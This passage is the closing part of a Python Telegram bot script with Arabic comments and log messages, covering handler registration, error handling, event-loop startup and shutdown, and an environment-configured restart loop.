        .pool_timeout(30)
        .build()
    )

    app.add_handler(CommandHandler(["start", "menu"], cmd_start))
    app.add_handler(CallbackQueryHandler(on_cb))
    app.add_handler(MessageHandler(filters.Document.ALL, on_doc))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_msg))

    async def error_handler(update, context) -> None:
        err = context.error
        if isinstance(err, RetryAfter):
            await asyncio.sleep(min(err.retry_after + 1, 60))
        elif isinstance(err, BadRequest):
            log.warning("Bad request: %s", err)
        elif "terminated by other getUpdates" in str(err).lower():
            log.warning("⚠️ نسخة أخرى من البوت تعمل!")
        else:
            log.error("Unhandled error: %s\n%s", err, traceback.format_exc())

    app.add_error_handler(error_handler)

    # تشغيل يدوي داخل نفس الـ loop — بدون loop.run_until_complete إضافي
    async with app:
        # إرسال رسالة ترحيب لكل أدمن
        await run_scheduled_jobs(app)
        # تشغيل الـ polling
        print("🟢  البوت يعمل بنجاح!\n")
        await app.updater.start_polling(
            drop_pending_updates=True,
            poll_interval=0.5,
            timeout=30,
            allowed_updates=["message", "callback_query"],
        )
        await app.start()
        # انتظار حتى يتم الإيقاف
        await asyncio.Event().wait()


def main() -> None:
    """نقطة الدخول — تُنشئ loop نظيف وتُشغّل البوت"""
    # إنشاء loop جديد نظيف بشكل صريح
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(_bot_main())
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        try:
            # إلغاء كل المهام المتبقية
            pending = asyncio.all_tasks(loop)
            for task in pending:
                task.cancel()
            if pending:
                loop.run_until_complete(asyncio.gather(*pending, return_exceptions=True))
        except Exception:
            pass
        finally:
            loop.close()


if __name__ == "__main__":
    import signal as _signal

    def _sig_handler(sig, frame):
        print("\n\n👋  تم إيقاف البوت — جاري الإغلاق الآمن…")
        sys.exit(0)

    _signal.signal(_signal.SIGINT,  _sig_handler)
    _signal.signal(_signal.SIGTERM, _sig_handler)

    _MAX_RETRIES = int(os.environ.get("BOT_MAX_RETRIES", "10"))
    _RETRY_DELAY = int(os.environ.get("BOT_RETRY_DELAY", "15"))
    _attempt     = 0

    while True:
        try:
            main()
            break
        except KeyboardInterrupt:
            print("\n\n👋  تم إيقاف البوت بواسطة المستخدم")
            sys.exit(0)
        except SystemExit:
            raise
        except Exception as e:
            _attempt += 1
            err_msg = str(e)
            if "terminated by other getUpdates" in err_msg.lower():
                log.error("⛔ نسخة أخرى من البوت تعمل! أوقف النسخ الأخرى أولاً.")
                sys.exit(1)
            log.error("❌ خطأ (محاولة %d/%d): %s", _attempt, _MAX_RETRIES, e)
            traceback.print_exc()
            if _attempt >= _MAX_RETRIES:
                log.critical("🛑 وصل للحد الأقصى (%d محاولة) — إيقاف.", _MAX_RETRIES)
                sys.exit(1)
            log.info("🔄 إعادة المحاولة خلال %d ثانية…", _RETRY_DELAY)
            time.sleep(_RETRY_DELAY)